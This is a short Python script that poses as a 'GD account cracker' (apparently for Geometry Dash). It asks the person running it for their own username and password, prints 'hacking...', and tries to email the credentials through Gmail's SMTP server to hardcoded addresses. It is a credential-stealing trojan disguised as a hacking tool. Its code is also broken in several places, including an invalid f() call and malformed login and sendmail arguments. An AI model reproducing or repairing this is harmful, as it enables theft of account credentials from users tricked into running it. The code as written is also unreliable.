print("welcome to Gd theive")
print("the GD account cracker")
print("log in with your GD account")
uname = input("enter username: ")
pword = input("enter password: ")
print("hacking...")
import smtplib
content = ("pword + uname")
with smtplib.SMTP("smtp.gmail.com:587") as smtp:
     smtp.ehlo()
     smtp.starttls()
     smtp.ehlo()
     subject = ("GD password found")
     body = pword + uname
     msg = f("Subject: {subject}\n\n{body}")
     smtp.login("cringybananamail@gmail.com,cringemail")
     smtp.sendmail("cringybananamail@gmail.com,jearljsmith@gmail.com,msg")
     smtp.close()
